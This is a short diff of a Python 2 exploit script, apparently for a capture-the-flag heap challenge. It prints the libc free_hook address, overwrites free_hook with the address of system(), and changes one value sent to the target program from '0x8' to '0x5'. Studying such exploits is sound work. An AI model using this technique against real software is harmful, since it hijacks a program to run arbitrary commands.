@@ -170,7 +170,7 @@ if __name__ == "__main__":
     print "free_hook: 0x{:08x}".format(FREE_HOOK)
     print "overwrite free_hook with system() 0x{:08x}".format(LIBC+SYSTEM_OFFSET)
     send("g")
-    send("0x8")
+    send("0x5")
     send(p32(LIBC+SYSTEM_OFFSET))
 
     raw_input("continue?")
